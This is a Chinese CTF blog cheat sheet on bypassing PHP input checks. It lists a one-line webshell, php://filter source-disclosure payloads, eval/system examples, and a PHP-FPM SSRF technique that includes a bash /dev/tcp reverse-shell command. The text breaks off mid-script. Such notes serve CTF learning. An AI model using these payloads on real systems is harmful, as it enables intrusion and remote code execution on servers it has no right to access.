<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>PHP绕过 | Lazzaro</title><meta name="description" content="常用函数phpinfo()    #PHP配置页 file_get_contents()    #获取文件内容 get_defined_vars()    #获取所有文件（包括包含的文件）变量的值 ​     变种一句话PHP $_GET[a]($_GET[b]); ​     常用php:&#x2F;&#x2F;filter过滤器 无过滤器 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;  字符串过滤器 php:&#x2F;&#x2F;"><meta property="og:type" content="article"><meta property="og:title" content="PHP绕过"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="常用函数phpinfo()    #PHP配置页 file_get_contents()    #获取文件内容 get_defined_vars()    #获取所有文件（包括包含的文件）变量的值 ​     变种一句话PHP $_GET[a]($_GET[b]); ​     常用php:&#x2F;&#x2F;filter过滤器 无过滤器 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;  字符串过滤器 php:&#x2F;&#x2F;"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2020-05-18T11:29:09.000Z"><meta property="article:modified_time" content="2022-01-03T05:04:08.297Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="绕过"><meta property="article:tag" content="PHP"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">29</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.8px">2021赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.4px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.2px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/node-js/" style="font-size:13px">node.js</a> <a href="/tags/nodejs/" style="font-size:13px">nodejs</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.6px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.2px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.2px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.6px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.2px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.4px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E7%A7%8D%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">2.</span> <span class="toc-text">变种一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8php-filter%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">常用php:&#x2F;&#x2F;filter过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">4.</span> <span class="toc-text">常用路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-number">5.1.</span> <span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval"><span class="toc-number">5.2.</span> <span class="toc-text">intval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric"><span class="toc-number">5.3.</span> <span class="toc-text">is_numeric()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match"><span class="toc-number">5.4.</span> <span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array"><span class="toc-number">5.5.</span> <span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-%E2%80%98QUERY-STRING%E2%80%99"><span class="toc-number">5.6.</span> <span class="toc-text">$_SERVER[‘QUERY_STRING’]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REQUEST"><span class="toc-number">5.7.</span> <span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-number">5.8.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-put-contents"><span class="toc-number">5.9.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sha1-%E6%AF%94%E8%BE%83"><span class="toc-number">5.10.</span> <span class="toc-text">sha1()比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-%E6%AF%94%E8%BE%83"><span class="toc-number">5.11.</span> <span class="toc-text">md5()比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">5.12.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-number">5.13.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg"><span class="toc-number">5.14.</span> <span class="toc-text">escapeshellarg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg-eregi"><span class="toc-number">5.15.</span> <span class="toc-text">ereg() &#x2F; eregi()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos"><span class="toc-number">5.16.</span> <span class="toc-text">strpos()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp"><span class="toc-number">5.17.</span> <span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-slashes"><span class="toc-number">5.18.</span> <span class="toc-text">add_slashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">5.19.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter-var"><span class="toc-number">5.20.</span> <span class="toc-text">filter_var()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-file-file-exists"><span class="toc-number">5.21.</span> <span class="toc-text">is_file() &#x2F; file_exists()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">5.22.</span> <span class="toc-text">include() （文件包含）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#die-exit"><span class="toc-number">5.23.</span> <span class="toc-text">die() &#x2F; exit()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open"><span class="toc-number">5.24.</span> <span class="toc-text">open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-url"><span class="toc-number">5.25.</span> <span class="toc-text">parse_url()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basename"><span class="toc-number">5.26.</span> <span class="toc-text">basename()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">5.27.</span> <span class="toc-text">参数特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97-%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7RCE"><span class="toc-number">5.28.</span> <span class="toc-text">无字母&#x2F;数字&#x2F;特定符号RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0-%E5%B8%A6%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.29.</span> <span class="toc-text">无参数&#x2F;带参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0"><span class="toc-number">5.29.1.</span> <span class="toc-text">无参函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%97%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E6%9C%89%E5%8F%82%EF%BC%89"><span class="toc-number">5.29.2.</span> <span class="toc-text">套用函数（有参）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.29.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">5.30.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">5.31.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E7%B1%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">5.32.</span> <span class="toc-text">读类信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-disable-function"><span class="toc-number">5.33.</span> <span class="toc-text">bypass disable_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">5.34.</span> <span class="toc-text">bypass open_basedir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">5.35.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.36.</span> <span class="toc-text">中间件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache"><span class="toc-number">5.36.1.</span> <span class="toc-text">Apache</span></a></li></ol></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-PHP绕过" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">PHP绕过</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="article-date"><time datetime="2020-05-18T11:29:09.000Z" itemprop="datePublished">2020-05-18</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="article-tag-link-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">绕过</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="leancloud_visitors" data-flag-title="PHP绕过"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>phpinfo() #PHP配置页</p><p>file_get_contents() #获取文件内容</p><p>get_defined_vars() #获取所有文件（包括包含的文件）变量的值</p><p>​</p><h2 id="变种一句话"><a href="#变种一句话" class="headerlink" title="变种一句话"></a>变种一句话</h2><p><strong>PHP</strong></p><p><code>$_GET[a]($_GET[b]);</code></p><p>​</p><h2 id="常用php-filter过滤器"><a href="#常用php-filter过滤器" class="headerlink" title="常用php://filter过滤器"></a>常用php://filter过滤器</h2><ul><li><p><strong>无过滤器</strong></p><p><code>php://filter/resource=</code></p></li><li><p><strong>字符串过滤器</strong></p><p><code>php://filter/read=string.rot13/resource=</code></p><p><code>php://filter/read=string.toupper/resource=</code></p><p><code>php://filter/read=string.tolower/resource=</code></p><p><code>php://filter/read=string.string_tags/resource=</code></p></li><li><p><strong>转换过滤器</strong></p><p><code>php://filter/read=convert.base64-encode/resource=</code></p><p><code>php://filter/read=convert.quoted-printable-encode/resource=</code></p></li></ul><p>​</p><h2 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h2><ul><li><p><strong>Nginx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">日志：</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p><strong>Apache</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">日志：</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/log/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure></li></ul><p>​</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>32位：-2147483648 ~ 2147483647</p><p>64位：-9223372036854775808 ~ 9223372036854775807</p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><ol><li><p>进制转换</p><p>十六进制：0x???</p><p>二进制：0b???</p><p>八进制：0???</p></li></ol><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><ol><li><p>特殊字符</p><p>空格、%00、%0a</p></li></ol><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><ol><li><p>换行符 %0a（按行匹配类）</p><p>preg_match值只匹配第一行，对于<code>/^xxx$/</code>类型，在前端或末尾加上%0a即可绕过。</p></li><li><p>命名空间（\）</p><blockquote><p>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \system(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure></blockquote><p>参考：<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/#function">Code-Breaking Puzzles 题解&amp;学习篇</a></p></li><li><p>符号</p><ul><li><p>分号：<code>?&gt;</code>闭合</p></li><li><p>小括号：<code>?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php</code></p></li></ul></li><li><p>数组</p><p>preg_match只能处理字符串，当传入的subject是数组时会返回false。</p></li><li><p>PCRE回溯次数限制</p><p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false。</p></li></ol><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><ol><li><p>命名空间（\）</p><blockquote><p>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \system(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure><p>参考：<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/#function">Code-Breaking-Puzzles-题解-学习篇</a></p></li></ol><h3 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h3><ol><li><p>URL编码</p><p>$_SERVER[‘QUERY_STRING’]不会进行URLDecode。</p></li><li><p>变量覆盖</p><p><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p></li></ol><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ol><li><p>POST覆盖</p><p>$_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值，只需要同时GET和POST有相同的参数，在检测时POST的值就会覆盖GET的值从而绕过。</p></li></ol><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><ol><li>使用 php://input 或 data://text/plain,xxx 写文件</li></ol><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><ol><li><p>攻击php-fpm（未授权访问漏洞）</p><p>如果目标主机上正在运行着 <code>PHP-FPM</code>，并且有一个<code>file_put_contents()</code>函数的参数是可控的，可以使用 <code>FTP</code> 协议的被动模式：客户端试图从<code>FTP</code>服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的<code>IP</code>和端口上，我们可以指定到<code>127.0.0.1:9000</code>，这样就可以向目标主机的 <code>PHP-FPM</code> 发送一个任意的数据包，从而执行代码，造成<code>SSRF</code>。</p><p><code>file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]);</code></p><p>先用 <code>gopherus</code> 生成一个反弹<code>shell</code>的<code>payload</code>，截取 <code>_</code> 后面的部分</p><p><code>/var/www/html/index.php</code></p><p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;</code></p><p>关于<code>FTP</code>的<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangzhufei/article/details/86177015">返回码</a>，我们看到<code>227</code>：</p><blockquote><p><code>Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; 进入被动模式(h1,h2,h3,h4,p1,p2)</code></p></blockquote><p>我们可以用来进入被动模式，<code>h</code>和<code>p</code>分别为地址和端口，搭建一个恶意的 <code>ftp</code> 服务器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 